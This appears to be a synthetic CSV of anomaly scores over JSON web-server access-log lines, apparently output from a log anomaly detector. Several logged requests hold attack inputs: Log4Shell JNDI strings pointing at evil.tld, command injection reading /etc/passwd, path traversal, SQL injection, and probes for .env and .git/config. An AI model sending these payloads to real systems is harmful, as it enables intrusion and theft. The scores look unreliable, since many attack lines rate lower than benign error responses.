score_content,score_session,score_fused,score_fused_norm,line
72.98516082763672,,72.98516082763672,72.98516082763672,{"remote_addr": "112.32.217.161", "time_local": "11/Jan/2025:09:00:08 -0700", "request": "OPTIONS / HTTP/2", "status": 200, "body_bytes_sent": 9036, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
73.72234344482422,,73.72234344482422,73.72234344482422,{"remote_addr": "196.196.129.142", "time_local": "11/Jan/2025:09:00:08 -0700", "request": "OPTIONS /cgi-bin/test.cgi HTTP/2", "status": 301, "body_bytes_sent": 14422, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
49.58926773071289,,49.58926773071289,49.58926773071289,{"remote_addr": "169.45.210.229", "time_local": "11/Jan/2025:09:00:09 -0700", "request": "DELETE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 2895, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
24.368318557739258,,24.368318557739258,24.368318557739258,{"remote_addr": "248.130.66.97", "time_local": "11/Jan/2025:09:00:10 -0700", "request": "GET /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 8937, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
3.0926828384399414,,3.0926828384399414,3.0926828384399414,{"remote_addr": "185.57.219.142", "time_local": "11/Jan/2025:09:00:11 -0700", "request": "GET /assets/app.css HTTP/2", "status": 302, "body_bytes_sent": 10388, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
2.0218238830566406,,2.0218238830566406,2.0218238830566406,{"remote_addr": "239.139.226.183", "time_local": "11/Jan/2025:09:00:12 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 9360, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
49.714195251464844,,49.714195251464844,49.714195251464844,{"remote_addr": "98.157.147.67", "time_local": "11/Jan/2025:09:00:13 -0700", "request": "DELETE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 4767, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
70.98837280273438,,70.98837280273438,70.98837280273438,{"remote_addr": "19.231.59.58", "time_local": "11/Jan/2025:09:00:14 -0700", "request": "OPTIONS /.git/config HTTP/2", "status": 200, "body_bytes_sent": 17320, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
69.54595947265625,,69.54595947265625,69.54595947265625,{"remote_addr": "140.152.115.152", "time_local": "11/Jan/2025:09:00:14 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 16360, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
24.338855743408203,,24.338855743408203,24.338855743408203,{"remote_addr": "23.14.97.145", "time_local": "11/Jan/2025:09:00:14 -0700", "request": "GET /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 6917, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
24.327821731567383,,24.327821731567383,24.327821731567383,{"remote_addr": "190.132.180.109", "time_local": "11/Jan/2025:09:00:15 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 3159, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
95.14785766601562,,95.14785766601562,95.14785766601562,{"remote_addr": "117.254.9.27", "time_local": "11/Jan/2025:09:00:16 -0700", "request": "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 16184, "http_referer": "-", "http_user_agent": "dirb/2.22"}
0.21930351853370667,,0.21930351853370667,0.21930351853370667,{"remote_addr": "118.61.190.217", "time_local": "11/Jan/2025:09:00:16 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 11051, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
47.20134353637695,,47.20134353637695,47.20134353637695,{"remote_addr": "120.114.183.51", "time_local": "11/Jan/2025:09:00:17 -0700", "request": "HEAD /about HTTP/2", "status": 200, "body_bytes_sent": 2701, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
35.50231170654297,,35.50231170654297,35.50231170654297,{"remote_addr": "171.235.162.203", "time_local": "11/Jan/2025:09:00:18 -0700", "request": "PUT /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 12193, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
27.091144561767578,,27.091144561767578,27.091144561767578,{"remote_addr": "30.130.241.15", "time_local": "11/Jan/2025:09:00:18 -0700", "request": "POST /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 10140, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
47.08928298950195,,47.08928298950195,47.08928298950195,{"remote_addr": "178.5.5.164", "time_local": "11/Jan/2025:09:00:19 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 6157, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
4.890226364135742,,4.890226364135742,4.890226364135742,{"remote_addr": "94.197.246.201", "time_local": "11/Jan/2025:09:00:20 -0700", "request": "GET /profile HTTP/2", "status": 302, "body_bytes_sent": 7225, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
30184.900390625,,30184.900390625,30184.900390625,{"remote_addr": "136.243.61.144", "time_local": "11/Jan/2025:09:00:21 -0700", "request": "HEAD /wp-login.php HTTP/2", "status": 400, "body_bytes_sent": 465, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
103.94068145751953,,103.94068145751953,103.94068145751953,{"remote_addr": "248.65.188.195", "time_local": "11/Jan/2025:09:00:21 -0700", "request": "TRACE /contact HTTP/2", "status": 200, "body_bytes_sent": 4901, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
94.99498748779297,,94.99498748779297,94.99498748779297,{"remote_addr": "194.136.81.21", "time_local": "11/Jan/2025:09:00:22 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 5647, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
3.1131789684295654,,3.1131789684295654,3.1131789684295654,{"remote_addr": "173.33.104.27", "time_local": "11/Jan/2025:09:00:23 -0700", "request": "GET /assets/app.js HTTP/2", "status": 302, "body_bytes_sent": 709, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
69.46263885498047,,69.46263885498047,69.46263885498047,{"remote_addr": "73.73.102.83", "time_local": "11/Jan/2025:09:00:23 -0700", "request": "HEAD /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 5703, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
30164.0546875,,30164.0546875,30164.0546875,{"remote_addr": "251.132.164.48", "time_local": "11/Jan/2025:09:00:24 -0700", "request": "GET /search?q=ssd HTTP/2", "status": 403, "body_bytes_sent": 373, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
27.070112228393555,,27.070112228393555,27.070112228393555,{"remote_addr": "232.148.156.53", "time_local": "11/Jan/2025:09:00:24 -0700", "request": "POST /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 10691, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
49.603763580322266,,49.603763580322266,49.603763580322266,{"remote_addr": "107.232.239.212", "time_local": "11/Jan/2025:09:00:25 -0700", "request": "DELETE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 7850, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
49.62385177612305,,49.62385177612305,49.62385177612305,{"remote_addr": "246.211.245.94", "time_local": "11/Jan/2025:09:00:26 -0700", "request": "DELETE /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 7551, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
95.0455093383789,,95.0455093383789,95.0455093383789,{"remote_addr": "131.191.13.248", "time_local": "11/Jan/2025:09:00:26 -0700", "request": "OPTIONS /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 15117, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
72.71356964111328,,72.71356964111328,72.71356964111328,{"remote_addr": "3.19.247.160", "time_local": "11/Jan/2025:09:00:26 -0700", "request": "OPTIONS /profile HTTP/2", "status": 200, "body_bytes_sent": 14930, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
50.15961837768555,,50.15961837768555,50.15961837768555,{"remote_addr": "159.146.220.148", "time_local": "11/Jan/2025:09:00:27 -0700", "request": "HEAD /about HTTP/2", "status": 304, "body_bytes_sent": 405, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
30165.060546875,,30165.060546875,30165.060546875,{"remote_addr": "195.74.150.80", "time_local": "11/Jan/2025:09:00:28 -0700", "request": "DELETE /cgi-bin/test.cgi HTTP/2", "status": 403, "body_bytes_sent": 1274, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
0.20964384078979492,,0.20964384078979492,0.20964384078979492,{"remote_addr": "221.94.13.196", "time_local": "11/Jan/2025:09:00:29 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 8039, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
69.51876831054688,,69.51876831054688,69.51876831054688,{"remote_addr": "110.202.137.45", "time_local": "11/Jan/2025:09:00:30 -0700", "request": "HEAD /api/user?id=1;DROP TABLE users HTTP/2", "status": 200, "body_bytes_sent": 7324, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
30190.67578125,,30190.67578125,30190.67578125,{"remote_addr": "135.22.221.189", "time_local": "11/Jan/2025:09:00:30 -0700", "request": "DELETE /api/product?id=123 HTTP/2", "status": 429, "body_bytes_sent": 21, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
27.159645080566406,,27.159645080566406,27.159645080566406,{"remote_addr": "223.128.105.15", "time_local": "11/Jan/2025:09:00:31 -0700", "request": "POST /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 16337, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
11029.876953125,,11029.876953125,11029.876953125,{"remote_addr": "159.164.148.146", "time_local": "11/Jan/2025:09:00:32 -0700", "request": "GET /.git/config HTTP/2", "status": 502, "body_bytes_sent": 1311, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
49.69920349121094,,49.69920349121094,49.69920349121094,{"remote_addr": "48.180.192.247", "time_local": "11/Jan/2025:09:00:33 -0700", "request": "DELETE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 15683, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
75.66954040527344,,75.66954040527344,75.66954040527344,{"remote_addr": "31.76.45.245", "time_local": "11/Jan/2025:09:00:34 -0700", "request": "OPTIONS /login HTTP/2", "status": 302, "body_bytes_sent": 14667, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
0.528705894947052,,0.528705894947052,0.528705894947052,{"remote_addr": "178.7.254.133", "time_local": "11/Jan/2025:09:00:34 -0700", "request": "GET /.env HTTP/2", "status": 200, "body_bytes_sent": 7703, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
72.64019012451172,,72.64019012451172,72.64019012451172,{"remote_addr": "167.222.67.42", "time_local": "11/Jan/2025:09:00:35 -0700", "request": "OPTIONS /dashboard HTTP/2", "status": 200, "body_bytes_sent": 12828, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
0.2191237509250641,,0.2191237509250641,0.2191237509250641,{"remote_addr": "152.60.219.133", "time_local": "11/Jan/2025:09:00:35 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 3031, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
2.076789617538452,,2.076789617538452,2.076789617538452,{"remote_addr": "3.164.104.196", "time_local": "11/Jan/2025:09:00:36 -0700", "request": "GET /about HTTP/2", "status": 200, "body_bytes_sent": 2081, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
47.17831039428711,,47.17831039428711,47.17831039428711,{"remote_addr": "236.174.50.244", "time_local": "11/Jan/2025:09:00:37 -0700", "request": "HEAD /logout HTTP/2", "status": 200, "body_bytes_sent": 7987, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
69.5058364868164,,69.5058364868164,69.5058364868164,{"remote_addr": "1.69.139.109", "time_local": "11/Jan/2025:09:00:37 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 2536, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
3.0222203731536865,,3.0222203731536865,3.0222203731536865,{"remote_addr": "192.28.201.90", "time_local": "11/Jan/2025:09:00:39 -0700", "request": "POST /index.html HTTP/2", "status": 201, "body_bytes_sent": 1520, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
0.19617360830307007,,0.19617360830307007,0.19617360830307007,{"remote_addr": "241.134.154.158", "time_local": "11/Jan/2025:09:00:40 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 3797, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
13.222891807556152,,13.222891807556152,13.222891807556152,{"remote_addr": "54.70.233.131", "time_local": "11/Jan/2025:09:00:41 -0700", "request": "PUT /login HTTP/2", "status": 200, "body_bytes_sent": 2549, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
0.19811302423477173,,0.19811302423477173,0.19811302423477173,{"remote_addr": "48.34.101.220", "time_local": "11/Jan/2025:09:00:42 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 1439, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
30141.5546875,,30141.5546875,30141.5546875,{"remote_addr": "129.58.100.212", "time_local": "11/Jan/2025:09:00:42 -0700", "request": "GET /dashboard HTTP/2", "status": 403, "body_bytes_sent": 1002, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
2.040890693664551,,2.040890693664551,2.040890693664551,{"remote_addr": "4.239.7.73", "time_local": "11/Jan/2025:09:00:43 -0700", "request": "GET /logout HTTP/2", "status": 200, "body_bytes_sent": 1604, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
45.30803680419922,,45.30803680419922,45.30803680419922,{"remote_addr": "127.12.132.203", "time_local": "11/Jan/2025:09:00:43 -0700", "request": "HEAD /../../etc/passwd HTTP/2", "status": 204, "body_bytes_sent": 16769, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
13.086365699768066,,13.086365699768066,13.086365699768066,{"remote_addr": "254.98.31.71", "time_local": "11/Jan/2025:09:00:44 -0700", "request": "PUT /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 14907, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
95.1102294921875,,95.1102294921875,95.1102294921875,{"remote_addr": "193.233.89.23", "time_local": "11/Jan/2025:09:00:45 -0700", "request": "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 3867, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
30234.6484375,,30234.6484375,30234.6484375,{"remote_addr": "142.57.140.245", "time_local": "11/Jan/2025:09:00:46 -0700", "request": "OPTIONS /search?q=phone HTTP/2", "status": 403, "body_bytes_sent": 1380, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
30186.8359375,,30186.8359375,30186.8359375,{"remote_addr": "21.135.173.44", "time_local": "11/Jan/2025:09:00:47 -0700", "request": "HEAD /about HTTP/2", "status": 401, "body_bytes_sent": 123, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
30144.033203125,,30144.033203125,30144.033203125,{"remote_addr": "130.76.206.191", "time_local": "11/Jan/2025:09:00:48 -0700", "request": "POST /server-status HTTP/2", "status": 400, "body_bytes_sent": 1134, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
27.25702476501465,,27.25702476501465,27.25702476501465,{"remote_addr": "43.135.218.100", "time_local": "11/Jan/2025:09:00:48 -0700", "request": "GET /search?q=camera HTTP/2", "status": 304, "body_bytes_sent": 7749, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
30163.85546875,,30163.85546875,30163.85546875,{"remote_addr": "212.129.23.178", "time_local": "11/Jan/2025:09:00:49 -0700", "request": "GET /search?q=monitor HTTP/2", "status": 400, "body_bytes_sent": 250, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
75.55389404296875,,75.55389404296875,75.55389404296875,{"remote_addr": "183.125.176.42", "time_local": "11/Jan/2025:09:00:50 -0700", "request": "OPTIONS /api/products HTTP/2", "status": 302, "body_bytes_sent": 16715, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
35.49658966064453,,35.49658966064453,35.49658966064453,{"remote_addr": "56.17.25.182", "time_local": "11/Jan/2025:09:00:50 -0700", "request": "PUT /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 10325, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
126.28340148925781,,126.28340148925781,126.28340148925781,{"remote_addr": "164.210.110.24", "time_local": "11/Jan/2025:09:00:51 -0700", "request": "TRACE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 15888, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
45.44074249267578,,45.44074249267578,45.44074249267578,{"remote_addr": "130.241.94.7", "time_local": "11/Jan/2025:09:00:51 -0700", "request": "HEAD /index.html HTTP/2", "status": 200, "body_bytes_sent": 7991, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
11098.9990234375,,11098.9990234375,11098.9990234375,{"remote_addr": "208.29.197.239", "time_local": "11/Jan/2025:09:00:52 -0700", "request": "HEAD /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 503, "body_bytes_sent": 119, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
102.19682312011719,,102.19682312011719,102.19682312011719,{"remote_addr": "62.68.157.80", "time_local": "11/Jan/2025:09:00:53 -0700", "request": "TRACE /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 10011, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
30141.4921875,,30141.4921875,30141.4921875,{"remote_addr": "232.1.149.96", "time_local": "11/Jan/2025:09:00:54 -0700", "request": "GET /contact HTTP/2", "status": 400, "body_bytes_sent": 1327, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
30243.6171875,,30243.6171875,30243.6171875,{"remote_addr": "103.7.151.168", "time_local": "11/Jan/2025:09:00:54 -0700", "request": "TRACE /logout HTTP/2", "status": 403, "body_bytes_sent": 560, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
0.5550640225410461,,0.5550640225410461,0.5550640225410461,{"remote_addr": "79.82.77.94", "time_local": "11/Jan/2025:09:00:56 -0700", "request": "GET /.env HTTP/2", "status": 200, "body_bytes_sent": 16526, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
24.434642791748047,,24.434642791748047,24.434642791748047,{"remote_addr": "37.126.156.64", "time_local": "11/Jan/2025:09:00:56 -0700", "request": "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 5806, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
2.1302905082702637,,2.1302905082702637,2.1302905082702637,{"remote_addr": "19.66.229.237", "time_local": "11/Jan/2025:09:00:57 -0700", "request": "GET /admin HTTP/2", "status": 200, "body_bytes_sent": 294, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
35.45448684692383,,35.45448684692383,35.45448684692383,{"remote_addr": "141.238.71.215", "time_local": "11/Jan/2025:09:00:58 -0700", "request": "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 5566, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
13.098455429077148,,13.098455429077148,13.098455429077148,{"remote_addr": "15.220.37.131", "time_local": "11/Jan/2025:09:00:59 -0700", "request": "PUT /api/products HTTP/2", "status": 204, "body_bytes_sent": 4429, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
11155.64453125,,11155.64453125,11155.64453125,{"remote_addr": "161.234.120.82", "time_local": "11/Jan/2025:09:00:59 -0700", "request": "TRACE /search?q=phone HTTP/2", "status": 500, "body_bytes_sent": 262, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
27.046693801879883,,27.046693801879883,27.046693801879883,{"remote_addr": "18.186.68.172", "time_local": "11/Jan/2025:09:00:59 -0700", "request": "POST /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 3099, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
30168.10546875,,30168.10546875,30168.10546875,{"remote_addr": "229.232.94.121", "time_local": "11/Jan/2025:09:01:00 -0700", "request": "DELETE /logout HTTP/2", "status": 429, "body_bytes_sent": 597, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
7.711034774780273,,7.711034774780273,7.711034774780273,{"remote_addr": "130.249.42.223", "time_local": "11/Jan/2025:09:01:00 -0700", "request": "POST /login HTTP/2", "status": 304, "body_bytes_sent": 3048, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
11.29946231842041,,11.29946231842041,11.29946231842041,{"remote_addr": "127.189.170.139", "time_local": "11/Jan/2025:09:01:01 -0700", "request": "PUT /../../etc/passwd HTTP/2", "status": 204, "body_bytes_sent": 6233, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
1.9327476024627686,,1.9327476024627686,1.9327476024627686,{"remote_addr": "116.40.241.67", "time_local": "11/Jan/2025:09:01:02 -0700", "request": "GET /dashboard HTTP/2", "status": 201, "body_bytes_sent": 2471, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
30244.025390625,,30244.025390625,30244.025390625,{"remote_addr": "161.192.103.111", "time_local": "11/Jan/2025:09:01:02 -0700", "request": "TRACE / HTTP/2", "status": 404, "body_bytes_sent": 76, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
7.688722133636475,,7.688722133636475,7.688722133636475,{"remote_addr": "213.32.43.176", "time_local": "11/Jan/2025:09:01:03 -0700", "request": "POST /login HTTP/2", "status": 301, "body_bytes_sent": 15437, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
